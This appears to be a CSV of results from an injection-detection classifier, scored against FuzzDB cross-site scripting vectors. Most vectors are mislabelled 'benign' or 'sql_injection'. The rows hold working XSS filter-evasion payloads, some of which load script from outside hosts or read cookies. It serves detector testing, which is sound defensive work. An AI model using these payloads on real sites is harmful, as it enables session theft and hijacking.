id,payload,actual,predicted
fuzzdb_1737,Exploit Name: Self-containing XSS with no dots,xss,benign
fuzzdb_1738,Exploit String: with(location)with(hash)eval(substring(1)),xss,benign
fuzzdb_1739,Exploit Description: This vector uses with() to activate the payload behind the fragment identifier. No dots are used to enable easier filter evasion.,xss,benign
fuzzdb_1740,"Exploit Tags: general, super short, self contained",xss,benign
fuzzdb_1741,Author Name: ma1,xss,benign
fuzzdb_1742,Spaces/Meta Chars,xss,benign
fuzzdb_1743,Exploit Name: Spaces/Meta Chars,xss,benign
fuzzdb_1744,"Exploit String: <IMG SRC="" &#14;  javascript:alert('XSS');"">",xss,sql_injection
fuzzdb_1746,"Exploit Tags: general, evil tags, obfuscated, internet explorer",xss,benign
fuzzdb_1747,Author Name: ha.ckers.org,xss,benign
fuzzdb_1748,SSI,xss,benign
fuzzdb_1749,Exploit Name: SSI,xss,benign
fuzzdb_1750,"Exploit String: <!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'""-->",xss,sql_injection
fuzzdb_1751,"Exploit Description: SSI (Server Side Includes) requires SSI to be installed on the server to use this XSS vector.  I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues.",xss,benign
fuzzdb_1752,"Exploit Tags: general, evil tags, obfuscated, SSI, injection",xss,benign
fuzzdb_1753,Author Name: ha.ckers.org,xss,benign
fuzzdb_1754,STYLE,xss,benign
fuzzdb_1755,Exploit Name: STYLE,xss,benign
fuzzdb_1756,"Exploit String: <STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss,benign
fuzzdb_1757,Exploit Description: STYLE tag (Older versions of Netscape only),xss,benign
fuzzdb_1758,"Exploit Tags: general, evil tags, style injection, gecko",xss,benign
fuzzdb_1759,Author Name: ha.ckers.org,xss,benign
fuzzdb_1760,Style injection via content and double-eval,xss,benign
fuzzdb_1761,Exploit Name: Style injection via content and double-eval,xss,benign
fuzzdb_1762,Exploit String: <style>,xss,benign
fuzzdb_1763,body:after{,xss,benign
fuzzdb_1764,content: “\61\6c\65\72\74\28\31\29″,xss,benign
fuzzdb_1765,},xss,benign
fuzzdb_1766,</style>,xss,benign
fuzzdb_1767,<script>,xss,benign
fuzzdb_1768,eval(eval(document.styleSheets[0].cssRules[0].style.content)),xss,benign
fuzzdb_1769,</script>,xss,benign
fuzzdb_1770,Exploit Description: This vector utilizes the CSS content property and fetches it off the document.styleSheets property afterwards. For correct execution of the payload a double-eval is needed.,xss,benign
fuzzdb_1771,"Exploit Tags: general, onfuscated, style injection",xss,benign
fuzzdb_1772,Author Name: .mario,xss,benign
fuzzdb_1773,STYLE w/Anonymous HTML,xss,benign
fuzzdb_1774,Exploit Name: STYLE w/Anonymous HTML,xss,benign
fuzzdb_1775,"Exploit String: <XSS STYLE=""xss:expression(alert('XSS'))"">",xss,benign
fuzzdb_1776,"Exploit Description: Anonymous HTML with STYLE attribute (IE and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter)",xss,benign
fuzzdb_1777,"Exploit Tags: general, evil tags, obfuscated, internet explorer",xss,benign
fuzzdb_1778,Author Name: ha.ckers.org,xss,benign
fuzzdb_1779,STYLE w/background,xss,benign
fuzzdb_1780,Exploit Name: STYLE w/background,xss,benign
fuzzdb_1782,Exploit Description: STYLE tag using background.,xss,benign
fuzzdb_1783,"Exploit Tags: general, evil tags, injection, internet explorer",xss,benign
fuzzdb_1784,Author Name: ha.ckers.org,xss,benign
fuzzdb_1785,STYLE w/background-image,xss,benign
fuzzdb_1786,Exploit Name: STYLE w/background-image,xss,benign
fuzzdb_1788,Exploit Description: STYLE tag using background-image.,xss,benign
fuzzdb_1789,"Exploit Tags: general, evil tags, internet explorer, style injection",xss,benign
fuzzdb_1790,Author Name: ha.ckers.org,xss,benign
fuzzdb_1791,STYLE w/broken up JavaScript,xss,benign
fuzzdb_1792,Exploit Name: STYLE w/broken up JavaScript,xss,benign
fuzzdb_1793,"Exploit String: <STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss,benign
fuzzdb_1794,Exploit Description: STYLE tags with broken up JavaScript for XSS (this XSS at times sends IE into an infinite loop of alerts).,xss,benign
fuzzdb_1795,"Exploit Tags: general, evil tags, style injection, internet explorer",xss,benign
fuzzdb_1796,Author Name: ha.ckers.org,xss,benign
fuzzdb_1797,STYLE w/Comment,xss,benign
fuzzdb_1798,Exploit Name: STYLE w/Comment,xss,benign
fuzzdb_1799,"Exploit String: <IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss,sql_injection
fuzzdb_1800,Exploit Description: STYLE attribute using a comment to break up expression (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one),xss,benign
fuzzdb_1801,"Exploit Tags: general, evil tags, style injection, internet explorer",xss,benign
fuzzdb_1802,Author Name: ha.ckers.org,xss,benign
fuzzdb_1803,Stylesheet,xss,benign
fuzzdb_1804,Exploit Name: Stylesheet,xss,benign
fuzzdb_1806,Exploit Description: Stylesheet,xss,benign
fuzzdb_1807,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_1808,Author Name: ha.ckers.org,xss,benign
fuzzdb_1809,Style-breaker using obfuscated JavaScript,xss,benign
fuzzdb_1810,Exploit Name: Style-breaker using obfuscated JavaScript,xss,benign
fuzzdb_1812,Exploit Description: This vector ends styleblocks and uses obfuscated JavaScript to create an alert.,xss,benign
fuzzdb_1813,"Exploit Tags: general, html breaking, CSS breaking",xss,benign
fuzzdb_1814,Author Name: kishor,xss,benign
fuzzdb_1815,Super basic HTML breaker 2,xss,benign
fuzzdb_1816,Exploit Name: Super basic HTML breaker 2,xss,benign
fuzzdb_1817,"Exploit String: >""'",xss,benign
fuzzdb_1818,Exploit Description: This super basic vector breaks HTML attributes,xss,benign
fuzzdb_1819,"Exploit Tags: general, basic, super short, html breaking",xss,benign
fuzzdb_1820,Author Name: .mario,xss,benign
fuzzdb_1821,Super short XSS variant 1,xss,benign
fuzzdb_1822,Exploit Name: Super short XSS variant 1,xss,benign
fuzzdb_1823,Exploit String: a=alert,xss,benign
fuzzdb_1824,a(0),xss,benign
fuzzdb_1825,Exploit Description: This extremely short XSS vector works only when newlines can be injected.,xss,benign
fuzzdb_1826,"Exploit Tags: general, super short",xss,benign
fuzzdb_1827,Author Name: .mario,xss,benign
fuzzdb_1828,Super short XSS variant 2,xss,benign
fuzzdb_1829,Exploit Name: Super short XSS variant 2,xss,benign
fuzzdb_1830,Exploit String: A=alert;A(1),xss,benign
fuzzdb_1831,"Exploit Description: This extremely short XSS vector works with out the need for newlines to be injected,",xss,benign
fuzzdb_1832,"Exploit Tags: super short, general, basic",xss,benign
fuzzdb_1833,Author Name: -unknown-,xss,benign
fuzzdb_1834,TABLE,xss,benign
fuzzdb_1835,Exploit Name: TABLE,xss,benign
fuzzdb_1837,"Exploit Description: Table background (who would have thought tables were XSS targets... except me, of course).",xss,benign
fuzzdb_1838,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_1839,Author Name: ha.ckers.org,xss,benign
fuzzdb_1840,TD,xss,benign
fuzzdb_1841,Exploit Name: TD,xss,benign
fuzzdb_1843,Exploit Description: TD background.,xss,benign
fuzzdb_1844,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_1845,Author Name: ha.ckers.org,xss,benign
fuzzdb_1846,Textarea-breaker with mouseover,xss,benign
fuzzdb_1847,Exploit Name: Textarea-breaker with mouseover,xss,benign
fuzzdb_1849,Exploit Description: This vector breaks textareas and creates an element reacting on mouveover events.,xss,benign
fuzzdb_1850,"Exploit Tags: general, html breaking, obfuscated, user interaction",xss,benign
fuzzdb_1851,Author Name: kishor,xss,benign
fuzzdb_1852,Unicode encoded script tags,xss,benign
fuzzdb_1853,Exploit Name: Unicode encoded script tags,xss,benign
fuzzdb_1854,Exploit String: '%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e',xss,benign
fuzzdb_1855,Exploit Description: This vector uses unicode encoded codepoints to create a script tag producing an alert.,xss,benign
fuzzdb_1856,"Exploit Tags: general, basic, obfuscated, evil tags",xss,benign
fuzzdb_1857,Author Name: OWASP,xss,benign
fuzzdb_1858,URL breaker for double quotes,xss,benign
fuzzdb_1859,Exploit Name: URL breaker for double quotes,xss,benign
fuzzdb_1861,Exploit Description: This vector breaks double quoted URL input,xss,benign
fuzzdb_1862,"Exploit Tags: URL breaking, general, basic, html breaking",xss,benign
fuzzdb_1863,Author Name: .mario,xss,benign
fuzzdb_1864,URL breaker for single quotes,xss,benign
fuzzdb_1865,Exploit Name: URL breaker for single quotes,xss,benign
fuzzdb_1867,Exploit Description: This vector breaks single quoted URL input,xss,benign
fuzzdb_1868,"Exploit Tags: URL breaking, basic, general, html breaking",xss,benign
fuzzdb_1869,Author Name: .mario,xss,benign
fuzzdb_1870,URL encoded image source,xss,benign
fuzzdb_1871,Exploit Name: URL encoded image source,xss,benign
fuzzdb_1873,Exploit Description: This vector utilizes an urlencoded JS image source to create an alert.,xss,benign
fuzzdb_1874,"Exploit Tags: general, basic, obfuscated, internet explorer",xss,benign
fuzzdb_1875,Author Name: OWASP,xss,benign
fuzzdb_1876,URL Encoding,xss,benign
fuzzdb_1877,Exploit Name: URL Encoding,xss,benign
fuzzdb_1878,"Exploit String: <A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>",xss,benign
fuzzdb_1879,Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).,xss,benign
fuzzdb_1880,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1881,Author Name: ha.ckers.org,xss,benign
fuzzdb_1882,URL-breaking vector,xss,benign
fuzzdb_1883,Exploit Name: URL-breaking vector,xss,benign
fuzzdb_1885,Exploit Description: This vector is a basic URL breaker - embedding an alert in a URL-like wrapper.,xss,benign
fuzzdb_1886,"Exploit Tags: general, URL breaking, basic",xss,benign
fuzzdb_1887,Author Name: kishor,xss,benign
fuzzdb_1888,US-ASCII encoding,xss,benign
fuzzdb_1889,Exploit Name: US-ASCII encoding,xss,benign
fuzzdb_1890,Exploit String: %BCscript%BEalert(%A2XSS%A2)%BC/script%BE,xss,benign
fuzzdb_1891,"Exploit Description: Found by Kurt Huwig http://www.iku-ag.de/ This uses malformed ASCII encoding with 7 bits instead of 8.  This XSS may bypass many content filters but only works if the hosts transmits in US-ASCII encoding, or if you set the encoding yourself.  This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion.  Apache Tomcat is the only known server that transmits in US-ASCII encoding.",xss,benign
fuzzdb_1892,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1893,Author Name: ha.ckers.org,xss,benign
fuzzdb_1894,UTF-7 Encoding,xss,benign
fuzzdb_1895,Exploit Name: UTF-7 Encoding,xss,benign
fuzzdb_1896,"Exploit String: <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss,benign
fuzzdb_1897,"Exploit Description: UTF-7 encoding - if the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one). You don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 IE rendering engine mode). Watchfire  http://seclists.org/lists/fulldisclosure/2005/Dec/1107.html found this hole in Google's custom 404 script.",xss,benign
fuzzdb_1898,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1899,Author Name: ha.ckers.org,xss,benign
fuzzdb_1900,UTF-8 Unicode Encoding,xss,benign
fuzzdb_1901,Exploit Name: UTF-8 Unicode Encoding,xss,benign
fuzzdb_1902,Exploit String: <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss,sql_injection
fuzzdb_1904,"Exploit Tags: general, evil tags, obfuscated, internet explorer",xss,benign
fuzzdb_1905,Author Name: ha.ckers.org,xss,benign
fuzzdb_1906,with() executing alert via document.__parent__,xss,benign
fuzzdb_1907,Exploit Name: with() executing alert via document.__parent__,xss,benign
fuzzdb_1908,Exploit String: with(document.__parent__)alert(1),xss,benign
fuzzdb_1909,Exploit Description: This vector uses the __parent__ property combined with with() to execute an alert.,xss,benign
fuzzdb_1910,"Exploit Tags: general, super short, obfuscated, gecko, __property__",xss,benign
fuzzdb_1911,Author Name: .mario,xss,benign
fuzzdb_1912,XML data island w/CDATA,xss,benign
fuzzdb_1913,Exploit Name: XML data island w/CDATA,xss,benign
fuzzdb_1914,"Exploit String: <XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>",xss,sql_injection
fuzzdb_1915,Exploit Description: XML data island with CDATA obfuscation (this XSS attack works only in IE and Netscape 8.1 IE rendering engine mode) - vector found by Sec Consult http://www.sec-consult.html while auditing Yahoo.,xss,benign
fuzzdb_1916,"Exploit Tags: general, evil tags, obfuscated, XML injection",xss,benign
fuzzdb_1917,Author Name: ha.ckers.org,xss,benign
fuzzdb_1918,XML data island w/comment,xss,benign
fuzzdb_1919,Exploit Name: XML data island w/comment,xss,benign
fuzzdb_1920,"Exploit String: <XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",xss,sql_injection
fuzzdb_1921,"Exploit Description: XML data island with comment obfuscation (doesn't use CDATA fields, but rather uses comments to break up the javascript directive)",xss,benign
fuzzdb_1922,"Exploit Tags: general, evil tags, obfuscated, XML injection",xss,benign
fuzzdb_1923,Author Name: ha.ckers.org,xss,benign
fuzzdb_1924,XML HTML+TIME,xss,benign
fuzzdb_1925,Exploit Name: XML HTML+TIME,xss,benign
fuzzdb_1926,"Exploit String: <HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>""> </BODY></HTML>",xss,sql_injection
fuzzdb_1927,Exploit Description: HTML+TIME in XML. This is how Grey Magic http://www.greymagic.com/security/advisories/gm005-mc/ hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work.,xss,benign
fuzzdb_1928,"Exploit Tags: general, evil tags, obfuscated, XML injection",xss,benign
fuzzdb_1929,Author Name: ha.ckers.org,xss,benign
fuzzdb_1930,XML namespace,xss,benign
fuzzdb_1931,Exploit Name: XML namespace,xss,benign
fuzzdb_1932,"Exploit String: <HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>",xss,benign
fuzzdb_1933,Exploit Description: XML namespace. The .htc file must be located on the server as your XSS vector.,xss,benign
fuzzdb_1934,"Exploit Tags: general, evil tags, obfuscated, XML injection",xss,benign
fuzzdb_1935,Author Name: ha.ckers.org,xss,benign
fuzzdb_1936,XML predicate XSS using content[n],xss,benign
fuzzdb_1937,Exploit Name: XML predicate XSS using content[n],xss,benign
fuzzdb_1938,Exploit String: y=<a>alert</a>;content[y](123),xss,benign
fuzzdb_1939,Exploit Description: This vector uses XML predicate properties to activate its payload.,xss,benign
fuzzdb_1940,"Exploit Tags: general, XML predicates, gecko",xss,benign
fuzzdb_1941,Author Name: PHPIDS Group,xss,benign
fuzzdb_1942,XML (locally hosted),xss,benign
fuzzdb_1943,Exploit Name: XML (locally hosted),xss,benign
fuzzdb_1944,"Exploit String: <XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",xss,sql_injection
fuzzdb_1945,Exploit Description: Locally hosted XML with embedded JavaScript that is generated using an XML data island. This is the same as above but instead refers to a locally hosted (must be on the same server) XML file that contains the cross site scripting vector.,xss,benign
fuzzdb_1946,"Exploit Tags: general, evil tags, obfuscated, XML injection",xss,benign
fuzzdb_1947,Author Name: ha.ckers.org,xss,benign
fuzzdb_1948,XSS Quick Test,xss,benign
fuzzdb_1949,Exploit Name: XSS Quick Test,xss,benign
fuzzdb_1950,"Exploit String: '';!--""<XSS>=&{()}",xss,sql_injection
fuzzdb_1951,"Exploit Description: If you don't have much space, this string is a nice compact XSS injection check. View source after injecting it and look for <XSS versus &lt;XSS to see if it is vulnerable.",xss,benign
fuzzdb_1952,"Exploit Tags: general, html breaking, JS breaking, comment breaking",xss,benign
fuzzdb_1953,Author Name: ha.ckers.org,xss,benign
fuzzdb_1954,XSS via VBScript MsgBox,xss,benign
fuzzdb_1955,Exploit Name: XSS via VBScript MsgBox,xss,benign
fuzzdb_1956,Exploit String: Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,xss,benign
fuzzdb_1957,Exploit Description: This vector creates an alert like message boy via Visual Basic Script,xss,benign
fuzzdb_1958,"Exploit Tags: general, basic, internet explorer",xss,benign
fuzzdb_1959,Author Name: -unknown-,xss,benign
fuzzdb_1960,__parent__ stored JS alert,xss,benign
fuzzdb_1961,Exploit Name: __parent__ stored JS alert,xss,benign
fuzzdb_1962,Exploit String: document.__parent__._=alert,xss,benign
fuzzdb_1963,_(1),xss,benign
fuzzdb_1964,Exploit Description: This vector uses the __parent__ property to store the alert function and execute it afterwards with new label.,xss,benign
fuzzdb_1965,"Exploit Tags: general, super short, obfuscated, gecko, __property__",xss,benign
fuzzdb_1966,Author Name: .mario,xss,benign
fuzzdb_1967,__proto__ stored JS alert,xss,benign
fuzzdb_1968,Exploit Name: __proto__ stored JS alert,xss,benign
fuzzdb_1969,Exploit String: top.__proto__._= alert,xss,benign
fuzzdb_1970,_(1),xss,benign
fuzzdb_1971,Exploit Description: This vector uses the __proto__ property to store the alert function and execute it afterwards with new label.,xss,benign
fuzzdb_1972,"Exploit Tags: general, super short, obfuscated, gecko, __property__",xss,benign
fuzzdb_1973,Author Name: .mario,xss,benign
fuzzdb_1974,iframe Chrome bypass,xss,benign
fuzzdb_1976,Author Name: thespanner.co.uk,xss,benign
fuzzdb_1977,anchor Chrome bypass,xss,benign
fuzzdb_1979,Author Name: thespanner.co.uk,xss,benign
fuzzdb_1980,wtf? Chrome,xss,benign
fuzzdb_1982,',xss,benign
fuzzdb_1983,<font style='color:expression(alert('XSS'))'>,xss,benign
fuzzdb_1984,' onmouseover=alert(/Black.Spook/),xss,benign
fuzzdb_1985,' or 2=2,xss,sql_injection
fuzzdb_1986,"""",xss,benign
fuzzdb_1987,""" or 202",xss,benign
fuzzdb_1988,""";eval(unescape(location))//#  %0Aalert(0)",xss,sql_injection
fuzzdb_1989,"""><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss,sql_injection
fuzzdb_1990,"""><iframe%20src=""http://google.com""%%203E",xss,benign
fuzzdb_1993,'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E,xss,sql_injection
fuzzdb_1994,%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E,xss,sql_injection
fuzzdb_1995,"%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E",xss,benign
fuzzdb_1996,&#x61;l&#x65;rt&#40;1),xss,sql_injection
fuzzdb_1997,&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>,xss,benign
fuzzdb_1998,&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi,xss,benign
fuzzdb_1999,&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;,xss,sql_injection
fuzzdb_2001,&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;,xss,benign
fuzzdb_2002,&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;,xss,sql_injection
fuzzdb_2003,&lt;SCRIPT SRC=//xss.rocks/.j>,xss,benign
fuzzdb_2004,'); alert('XSS,xss,benign
fuzzdb_2005,"\"";alert('XSS');//",xss,benign
fuzzdb_2006,<%<!--'%><script>alert(1);</script -->,xss,sql_injection
fuzzdb_2007,<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>,xss,benign
fuzzdb_2008,<--`<img/src=` onerror=alert(1)> --!>,xss,sql_injection
fuzzdb_2009,<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss,sql_injection
fuzzdb_2010,<<scr\0ipt/src=http://xss.com/xss.js></script,xss,benign
fuzzdb_2012,"<a  href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click  Me</a>",xss,sql_injection
fuzzdb_2013,<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss,sql_injection
fuzzdb_2014,"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",xss,sql_injection
fuzzdb_2015,"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss,sql_injection
fuzzdb_2016,"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss,benign
fuzzdb_2017,<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,xss,benign
fuzzdb_2022,"<a target=""x"" href=""xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",xss,sql_injection
fuzzdb_2023,"<a target=""x"" href=""xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>",xss,sql_injection
fuzzdb_2025,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss,sql_injection
fuzzdb_2028,<body/onload=&lt;!--&gt;&#10alert(1)>,xss,sql_injection
fuzzdb_2034,<form><button formaction=javascript&colon;alert(1)>CLICKME,xss,benign
fuzzdb_2040,"<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",xss,sql_injection
fuzzdb_2047,<iframe src=http://xss.rocks/scriptlet.html <,xss,benign
fuzzdb_2056,"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss,sql_injection
fuzzdb_2058,"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss,sql_injection
fuzzdb_2059,"<IMG SRC=""jav&amp;#x09;ascript:alert('XSS');"">",xss,sql_injection
fuzzdb_2060,"<IMG SRC=""jav&amp;#x0A;ascript:alert('XSS');"">",xss,sql_injection
fuzzdb_2061,"<IMG SRC=""jav&amp;#x0D;ascript:alert('XSS');"">",xss,sql_injection
fuzzdb_2064,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss,sql_injection
fuzzdb_2065,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss,sql_injection
fuzzdb_2067,<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #,xss,sql_injection
fuzzdb_2069,"<img src=x onerror=""&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"">",xss,sql_injection
fuzzdb_2073,"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss,benign
fuzzdb_2074,"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>?",xss,benign
fuzzdb_2078,<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss,sql_injection
fuzzdb_2081,<script itworksinallbrowsers>/*<script* */alert(1)</script ?,xss,sql_injection
fuzzdb_2083,"<SCRIPT SRC=""http:&#47;&#47;xss.rocks/xss.jpg""></SCRIPT>",xss,sql_injection
fuzzdb_2084,<SCRIPT SRC=http://xss.rocks/xss.js?< B >,xss,benign
fuzzdb_2085,<script x> alert(1) </script 1=2,xss,benign
